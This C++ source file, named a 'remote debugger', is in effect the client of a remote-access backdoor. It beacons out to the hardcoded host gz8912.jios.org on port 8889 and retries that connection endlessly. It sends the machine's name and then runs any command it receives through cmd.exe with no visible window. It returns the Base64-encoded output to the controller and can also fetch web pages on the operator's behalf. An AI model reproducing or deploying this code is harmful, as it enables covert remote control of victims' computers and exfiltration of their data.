// RemoteDebuger.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include <atlstr.h>
#include "RemoteDebuger.h"
#include "..\iocp\IOCPExport.h"
#pragma comment(lib,"IOCP.lib")

#include "..\公共\ProtocolHandler.h"



#include <windows.h>
#include <wininet.h>
#pragma comment(lib,"Wininet.lib")

#include <UrlMon.h>
#pragma comment(lib,"urlmon.lib")
#include <atlstr.h>

#include "..\公共\Base64.h"

#if defined(DEBUG) || defined(_DEBUG)
#define REMOTE_SERVER_IP "localhost"
#else
#define REMOTE_SERVER_IP "gz8912.jios.org"
#endif

CString GetHttpString( LPCWSTR pszUrl )
{
	HINTERNET hInternet1 = NULL;
	HINTERNET hInternet2 = NULL;
	CString strPageContent;

	do 
	{
		hInternet1 = InternetOpenW(NULL,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,NULL);
		if (NULL == hInternet1)
		{
			break;
		}
		BOOL bOption = TRUE;
		BOOL bSetRes = InternetSetOption(hInternet1,INTERNET_OPTION_HTTP_DECODING,&bOption,sizeof(BOOL));

		WCHAR szHeaderAdd[] = L"Accept-Encoding: gzip, deflate";
		HINTERNET hInternet2 = InternetOpenUrlW(hInternet1,pszUrl,szHeaderAdd,wcslen(szHeaderAdd),INTERNET_FLAG_NO_CACHE_WRITE,NULL);
		if (NULL == hInternet2)
		{
			break;
		}


		DWORD dwReadDataLength = NULL;
		BOOL bRet = TRUE;
		do 
		{
			CHAR chReadBuffer[4097];
			bRet = InternetReadFile(hInternet2,chReadBuffer,4096,&dwReadDataLength);
			chReadBuffer[dwReadDataLength] = 0;
			strPageContent+=chReadBuffer;
		} while (bRet && NULL != dwReadDataLength);

	} while (FALSE);

	InternetCloseHandle(hInternet2);
	InternetCloseHandle(hInternet1);

	return strPageContent;
}


typedef struct tagSTD_INFO{
	HANDLE hPipeRead;
	CHAR chOutputBuffer[4096];
	DWORD dwOutputBufferLen;
	HANDLE hReadEvent;
	HANDLE hContineEvent;
	DWORD dwReadLen;
	BOOL  bBreak;
}STD_INFO,*PSTD_INFO;

DWORD WINAPI StdOutReadThread( PVOID pParam )
{
	PSTD_INFO pStdInfo = (PSTD_INFO)pParam;

	DWORD dwReadLen = 0;
	while ( FALSE == pStdInfo->bBreak )
	{
		WaitForSingleObject(pStdInfo->hContineEvent,INFINITE);

		if ( FALSE == ReadFile(pStdInfo->hPipeRead,pStdInfo->chOutputBuffer,pStdInfo->dwOutputBufferLen-1,&dwReadLen,NULL) )
		{
			break;
		}

		pStdInfo->dwReadLen = dwReadLen;
		SetEvent(pStdInfo->hReadEvent);
	}

	return 0;
}

typedef VOID (WINAPI *TypeMsgOutputCallBack)( PVOID pParam,LPCSTR pszOutputMsg );


VOID ExecCmdLine( LPCWSTR pszCmdLine ,TypeMsgOutputCallBack pCallback,PVOID pParam )
{

	HANDLE hPipeRead = NULL;
	HANDLE hPipeWrite = NULL;
	SECURITY_ATTRIBUTES saAttr; 
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL; 


	BOOL bPipeRes = CreatePipe(&hPipeRead,&hPipeWrite,&saAttr,4096);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si,sizeof(si));
	ZeroMemory(&pi,sizeof(pi));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdOutput = hPipeWrite;
	//si.hStdInput = hPipeRead;
	si.hStdError = hPipeWrite;

	CString strCmdLine;
	strCmdLine.Format(L" /c %s",pszCmdLine);

	BOOL bRes = CreateProcessW(L"C:\\windows\\system32\\cmd.exe",strCmdLine.GetBuffer(),NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
	if (bRes)
	{
		STD_INFO *pStdInfo = new STD_INFO;
		pStdInfo->hPipeRead = hPipeRead;
		pStdInfo->dwOutputBufferLen = 4096;
		pStdInfo->hReadEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
		pStdInfo->hContineEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
		pStdInfo->bBreak = FALSE;

		HANDLE hReadThread = CreateThread(NULL,0,StdOutReadThread,pStdInfo,0,NULL);
		SetEvent(pStdInfo->hContineEvent);

		int nTimeOutCount = 0;


		while ( 1 )
		{

			DWORD dwWaitRes = WaitForSingleObject(pStdInfo->hReadEvent,100);
			if ( dwWaitRes != WAIT_OBJECT_0 )
			{
				nTimeOutCount++;

				if ( nTimeOutCount > 100 )
				{
					TerminateProcess(pi.hProcess,0);
				}
				//如果进程没有退出，则继续等待
				DWORD dwExitCode = 0;
				GetExitCodeProcess(pi.hProcess,&dwExitCode);
				if ( dwExitCode != STILL_ACTIVE )
				{
					break;
				}
			}
			else
			{
				nTimeOutCount = 0;
				pStdInfo->chOutputBuffer[pStdInfo->dwReadLen] = 0;

				/////////////////
				//处理输出的数据
				//OutputDebugStringA(pStdInfo->chOutputBuffer);
				//
				if (pCallback)
				{
					pCallback(pParam, pStdInfo->chOutputBuffer );
				}

				SetEvent(pStdInfo->hContineEvent);

			}
		}

		pStdInfo->bBreak = TRUE;
		SetEvent(pStdInfo->hContineEvent);
		bRes = CancelIoEx(hPipeRead,NULL);
		CloseHandle(hPipeRead);
		CloseHandle(hPipeWrite);
		WaitForSingleObject(hReadThread,INFINITE);
		CloseHandle(hReadThread);

		CloseHandle(pStdInfo->hContineEvent);
		CloseHandle(pStdInfo->hReadEvent);
		delete pStdInfo;

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

typedef struct tagOUTPUT_PARAM
{
	HANDLE      hClient;
	HANDLE     hSource;
}OUTPUT_PARAM,*POUTPUT_PARAM;
VOID WINAPI MsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
{
	POUTPUT_PARAM pOutputParam = (POUTPUT_PARAM)pParam;

	HANDLE hClient = pOutputParam->hClient;
	if (hClient)
	{
		CProtocolHandler ptlHandler;
		ptlHandler.SetParamValueString( "cmd","runcmd" );
		ptlHandler.SetParamValueString( "result",EasyBase64Encode(pszOutputMsg) );
		ptlHandler.SetParamValueInt( "target",(int)pOutputParam->hSource);
		CStringA strResponseData;
		strResponseData = ptlHandler.BuildData();

#ifdef DEBUG
//  		OutputDebugStringA("被控端\r\n");
//  		OutputDebugStringA(pszOutputMsg);
//  		OutputDebugStringA("\r\n");
// 		OutputDebugStringA(EasyBase64Encode(pszOutputMsg));
// 		OutputDebugStringA("\r\n");
#endif

		ClientSendData(hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
	}

}



class CCSLock
{
private:
	CRITICAL_SECTION m_cs;
public:
	CCSLock()
	{
		InitializeCriticalSection(&m_cs);
	}
	~CCSLock()
	{
		DeleteCriticalSection(&m_cs);
	}
	VOID Lock()
	{
		EnterCriticalSection(&m_cs);
	}

	VOID UnLock()
	{
		LeaveCriticalSection(&m_cs);
	}

};

typedef struct tagRUN_CMD_PARAM
{
	CString strCmdData;
	HANDLE hClient;
	HANDLE hSource;
}RUN_CMD_PARAM,*PRUN_CMD_PARAM;

CCSLock csLock;
BOOL  bRunningCmd = FALSE;

DWORD WINAPI RunCmdThread( PVOID pParam )
{
	PRUN_CMD_PARAM pRunCmdParam = (PRUN_CMD_PARAM)pParam;

	csLock.Lock();
	bRunningCmd = TRUE;
	csLock.UnLock();


	OUTPUT_PARAM OutputParam;
	OutputParam.hClient = pRunCmdParam->hClient;
	OutputParam.hSource = pRunCmdParam->hSource;

	if ( pRunCmdParam->strCmdData.Find(L"testweb") >= 0  )
	{
		CString strCmd;
		CString strWebUrl;

		int nIndex = 0;

		CString strNodes;
		CString strNode;
		int curPos = 0;
		
		strNodes = pRunCmdParam->strCmdData;
	
		strNode= strNodes.Tokenize(_T(" "),curPos);
		while (strNode != _T(""))
		{
			if ( 0 == nIndex )
			{
				strCmd = strNode;
			}
			else if( 1 == nIndex )
			{
				strWebUrl = strNode;
			}

			nIndex++;
			strNode = strNodes.Tokenize(_T(" "), curPos);
		};

		if ( strWebUrl.GetLength() > 0 )
		{
			CStringA strWebText;
			strWebText = GetHttpString( strWebUrl );

			CProtocolHandler ptlResponse;
			ptlResponse.SetParamValueString( "cmd","runcmd");
			ptlResponse.SetParamValueString( "result",EasyBase64Encode(strWebText));
			ptlResponse.SetParamValueInt( "target",(int)pRunCmdParam->hSource);

			CStringA strResponseData;
			strResponseData = ptlResponse.BuildData();
			ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
		}

	}
	else if( pRunCmdParam->strCmdData.Find(L"upload") >= 0 )
	{

	}
	else
	{
		ExecCmdLine(pRunCmdParam->strCmdData,MsgOutputCallBack,&OutputParam);
	}

	

	CProtocolHandler ptlResponse;
	ptlResponse.SetParamValueString( "cmd","runcmd");
	ptlResponse.SetParamValueString( "result",EasyBase64Encode("\r\n命令执行完成\r\n"));
	ptlResponse.SetParamValueInt( "target",(int)pRunCmdParam->hSource);

	CStringA strResponseData;
	strResponseData = ptlResponse.BuildData();

	ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());

	delete pRunCmdParam;

	csLock.Lock();
	bRunningCmd = FALSE;
	csLock.UnLock();
	
	return 0;
}

VOID WINAPI DataRecvCallback( HANDLE hClient, BYTE *pDataBuffer,DWORD dwDatalen )
{
	CProtocolHandler ptlHandler;
	ptlHandler.ParseProtocolString((LPCSTR)pDataBuffer,dwDatalen);

	HANDLE hSource = (HANDLE)ptlHandler.GetParamValueInt("source",0);

	CString strCmd;
	strCmd = ptlHandler.GetParamValueString("cmd","");
	if (strCmd == L"runcmd")
	{
		BOOL bCanRunCmd = FALSE;
		csLock.Lock();
		bCanRunCmd = !bRunningCmd;
		csLock.UnLock();

		if (bCanRunCmd)
		{
			CString strCmdData;
			strCmdData = ptlHandler.GetParamValueString("data","");

			PRUN_CMD_PARAM pRunCmdParam = new RUN_CMD_PARAM;
			pRunCmdParam->hSource = hSource;
			pRunCmdParam->strCmdData = strCmdData;
			pRunCmdParam->hClient = hClient;

			HANDLE hRunCmdThread = CreateThread(NULL,0,RunCmdThread,pRunCmdParam,0,NULL);
		}
	}
}
VOID WINAPI ConnectClosed( HANDLE hClient )
{
	DeleteClient(hClient);

	while (TRUE)
	{
		hClient = CreateClient(DataRecvCallback,ConnectClosed);
		BOOL bConRes = ClientConnect(hClient,REMOTE_SERVER_IP,8889);

		if (bConRes)
		{
			StartRecvData(hClient);
			break;
		}
		else
		{
			DeleteClient(hClient);
		}

		Sleep(10000);
	}


}


VOID WINAPI TestMsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
{
	OutputDebugStringA(pszOutputMsg);
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{

// 	{
// 		ExecCmdLine(L"tasklist /M",TestMsgOutputCallBack,NULL);
// 		return 0;
// 	}

	while (TRUE)
	{
		HANDLE hClient = CreateClient(DataRecvCallback,ConnectClosed);
		BOOL bConRes = ClientConnect(hClient,REMOTE_SERVER_IP,8889);

		if (bConRes)
		{	
			char chComputerName[100];
			DWORD dwNameLen = 100;
			GetComputerNameA(chComputerName,&dwNameLen);
			chComputerName[dwNameLen] = 0;
			int a=0;
			

			CProtocolHandler ptlReport;
			ptlReport.SetParamValueString("cmd","reportinfo");
			ptlReport.SetParamValueString("pcname",chComputerName);
			ptlReport.SetParamValueString("mac","AA-AA-CC-CC-DD-DD");

			CStringA strBuildData;
			strBuildData = ptlReport.BuildData();

			ClientSendData(hClient,(BYTE *)strBuildData.GetBuffer(),strBuildData.GetLength());

			StartRecvData(hClient);
			break;
		}

		DeleteClient(hClient);

		Sleep(5000);
	}

	while (1)
	{
		Sleep(1000);
	}
	

	return (int) 0;
}